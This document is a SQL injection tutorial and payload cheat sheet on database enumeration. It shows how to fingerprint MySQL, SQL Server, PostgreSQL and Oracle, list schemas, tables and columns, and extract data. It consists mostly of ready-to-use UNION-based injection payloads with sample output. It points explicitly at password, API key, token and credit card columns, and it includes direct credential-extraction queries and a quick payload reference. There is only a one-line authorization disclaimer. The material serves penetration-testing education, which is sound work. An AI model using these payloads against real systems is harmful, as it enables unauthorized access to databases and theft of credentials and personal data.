# Examining the database in SQL injection attacks

Once you've confirmed SQLi, the next step is reconnaissance: identifying the database type, version, structure (tables/columns), and available data. This information guides deeper exploitation, file access, privilege escalation, and lateral movement.

Database enumeration transforms a basic SQLi into targeted data extraction by revealing exactly what exists and where it's stored.

> Only test systems you own or are explicitly authorized to assess.

## Why database enumeration matters (targeted exploitation)

Without knowing the database structure, you're blind. With enumeration, you can:

- **Identify database type**: Different DBMSes use different syntax, functions, and exploitation techniques
- **Find sensitive tables**: `users`, `passwords`, `credit_cards`, `admin`, `config`
- **Map column names**: `password`, `password_hash`, `api_key`, `ssn`, `credit_card_number`
- **Locate credentials**: Database users, app users, admin accounts
- **Plan privilege escalation**: Identify functions for file access, command execution
- **Understand relationships**: Foreign keys, user roles, permission tables

## Database fingerprinting (identifying the DBMS)

### Method 1: Version queries (direct identification)

Each DBMS has specific version query syntax. Try all and see which succeeds.

#### MySQL / Microsoft SQL Server:
```sql
' UNION SELECT @@version--
' UNION SELECT @@version, NULL--
```

Example output (MySQL):
```text
5.7.33-0ubuntu0.16.04.1
```

Example output (SQL Server):
```text
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64>
```

#### PostgreSQL:
```sql
' UNION SELECT version()--
' UNION SELECT version(), NULL--
```

Example output:
```text
PostgreSQL 12.3 on x86_64-pc-linux-gnu, compiled by gcc 9.3.0, 64-bit
```

#### Oracle:
```sql
' UNION SELECT banner FROM v$version--
' UNION SELECT banner, NULL FROM v$version--
```

Example output:
```text
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
```

#### SQLite:
```sql
' UNION SELECT sqlite_version()--
```

### Method 2: Error message fingerprinting

Inject syntax errors and observe error messages:

MySQL:
```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
```

SQL Server:
```text
Unclosed quotation mark after the character string
Incorrect syntax near
```

PostgreSQL:
```text
ERROR: unterminated quoted string at or near
```

Oracle:
```text
ORA-00933: SQL command not properly ended
ORA-01756: quoted string not properly terminated
```

### Method 3: Behavior-based fingerprinting

#### String concatenation differences:
```sql
' UNION SELECT 'a'||'b'--     (Oracle, PostgreSQL - works)
' UNION SELECT 'a'+'b'--      (SQL Server - works)
' UNION SELECT CONCAT('a','b')--  (MySQL - works)
```

#### NULL handling:
```sql
' UNION SELECT NULL FROM dual--   (Oracle requires FROM dual)
' UNION SELECT NULL--             (Others work without FROM)
```

#### Comment syntax:
```sql
'--                               (Most DBMSes)
'#                                (MySQL only)
'/*                               (All - inline comment)
```

### Method 4: Time delay fingerprinting

Each DBMS has unique delay functions:

```sql
'; WAITFOR DELAY '0:0:5'--        (SQL Server - delays 5 sec)
' AND SLEEP(5)--                  (MySQL - delays 5 sec)
' || pg_sleep(5)--                (PostgreSQL - delays 5 sec)
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- (Oracle - delays 5 sec)
```

Observe response time to identify DBMS.

## Enumerating database structure (tables and columns)

### Standard approach: information_schema (MySQL, PostgreSQL, SQL Server)

#### List all databases:
```sql
' UNION SELECT schema_name, NULL FROM information_schema.schemata--
```

#### List all tables in current database:
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
```

Example output:
```text
products
users
orders
feedback
admin_users
api_keys
```

#### List tables with schema:
```sql
' UNION SELECT table_schema, table_name FROM information_schema.tables--
```

Output:
```text
myapp_db    users
myapp_db    products
myapp_db    admin_config
information_schema    tables
```

#### List columns for specific table:
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

Output:
```text
id
username
password
email
role
created_at
```

#### List columns with data types:
```sql
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'--
```

Output:
```text
id           int
username     varchar
password     varchar
email        varchar
role         varchar
api_key      varchar
```

#### Find interesting columns across all tables:
```sql
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%'--
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%key%'--
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%token%'--
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%credit%'--
```

### Oracle-specific enumeration (no information_schema)

Oracle uses different system tables:

#### List all tables:
```sql
' UNION SELECT table_name, NULL FROM all_tables--
' UNION SELECT table_name, NULL FROM user_tables--
```

#### List columns for specific table:
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**Important**: Oracle table names are uppercase by default:
```sql
WHERE table_name='USERS'  (not 'users')
```

#### List columns with data types:
```sql
' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name='USERS'--
```

#### Current database user:
```sql
' UNION SELECT user, NULL FROM dual--
```

#### List all database users:
```sql
' UNION SELECT username, NULL FROM all_users--
```

### MySQL-specific enumeration shortcuts

#### Current database:
```sql
' UNION SELECT database(), NULL--
```

#### List tables in current database:
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
```

#### Concatenate all table names:
```sql
' UNION SELECT GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema=database()--
```

Output: `users,products,orders,admin_config`

#### Concatenate all columns for a table:
```sql
' UNION SELECT GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='users'--
```

Output: `id,username,password,email,role,api_key`

### SQL Server-specific enumeration

#### Current database:
```sql
' UNION SELECT DB_NAME(), NULL--
```

#### List all databases:
```sql
' UNION SELECT name, NULL FROM master..sysdatabases--
```

#### List tables:
```sql
' UNION SELECT name, NULL FROM sysobjects WHERE xtype='U'--
```

#### List columns:
```sql
' UNION SELECT name, NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
```

### PostgreSQL-specific enumeration

#### Current database:
```sql
' UNION SELECT current_database(), NULL--
```

#### List databases:
```sql
' UNION SELECT datname, NULL FROM pg_database--
```

#### List tables:
```sql
' UNION SELECT tablename, NULL FROM pg_tables WHERE schemaname='public'--
```

## Practical enumeration workflow (step-by-step)

### Step 1: Identify DBMS type
Try version queries:
```sql
' UNION SELECT @@version, NULL--          (MySQL/SQL Server)
' UNION SELECT version(), NULL--          (PostgreSQL)
' UNION SELECT banner, NULL FROM v$version-- (Oracle)
```

### Step 2: Determine column count
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

Stop when query succeeds (no error).

### Step 3: Find string-compatible columns
```sql
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--
' UNION SELECT 'a', 'a'--
```

### Step 4: List all tables
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

Or for Oracle:
```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

### Step 5: Identify high-value targets
Look for tables named:
- `users`, `user`, `accounts`, `members`
- `admin`, `administrators`, `admin_users`
- `passwords`, `credentials`, `auth`
- `config`, `settings`, `configuration`
- `api_keys`, `tokens`, `sessions`
- `payment`, `credit_card`, `billing`

### Step 6: List columns for target tables
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

### Step 7: Extract data
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT email, api_key FROM users WHERE role='admin'--
```

## Advanced enumeration techniques

### Extract all table/column pairs:
```sql
' UNION SELECT CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns--
```

Output:
```text
users:id
users:username
users:password
users:email
products:id
products:name
products:price
```

### Count rows in tables:
```sql
' UNION SELECT 'users', (SELECT COUNT(*) FROM users)--
' UNION SELECT 'admin_users', (SELECT COUNT(*) FROM admin_users)--
```

### Find tables with most rows (interesting data):
```sql
' UNION SELECT table_name, table_rows FROM information_schema.tables ORDER BY table_rows DESC--
```

### Locate sensitive data patterns:
```sql
' UNION SELECT column_name, table_name FROM information_schema.columns WHERE column_name REGEXP 'pass|pwd|secret|key|token'--
```

### Check privileges (MySQL):
```sql
' UNION SELECT user, host FROM mysql.user--
' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges--
```

### Check privileges (SQL Server):
```sql
' UNION SELECT name, NULL FROM syslogins--
' UNION SELECT SUSER_NAME(), NULL--
```

### Check privileges (PostgreSQL):
```sql
' UNION SELECT usename, NULL FROM pg_user--
' UNION SELECT current_user, NULL--
```

### Check privileges (Oracle):
```sql
' UNION SELECT username, NULL FROM all_users--
' UNION SELECT privilege, NULL FROM session_privs--
```

## Database-specific system tables reference

### MySQL:
```text
information_schema.schemata         - databases
information_schema.tables           - tables
information_schema.columns          - columns
mysql.user                          - database users
information_schema.user_privileges  - privileges
```

### SQL Server:
```text
master..sysdatabases    - databases
sysobjects              - tables
syscolumns              - columns
syslogins               - logins
```

### PostgreSQL:
```text
pg_database             - databases
pg_tables               - tables
information_schema.columns - columns
pg_user                 - users
```

### Oracle:
```text
all_tables              - tables
all_tab_columns         - columns
all_users               - users
session_privs           - current user privileges
dba_tables              - all tables (requires DBA)
```

## Quick payload reference (enumeration)

Identify database:
```sql
' UNION SELECT @@version, NULL--
' UNION SELECT version(), NULL--
' UNION SELECT banner, NULL FROM v$version--
```

List tables:
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT table_name, NULL FROM all_tables--
```

List columns:
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--
```

Current database/user:
```sql
' UNION SELECT database(), user()--
' UNION SELECT DB_NAME(), SUSER_NAME()--
' UNION SELECT current_database(), current_user--
' UNION SELECT user, NULL FROM dual--
```
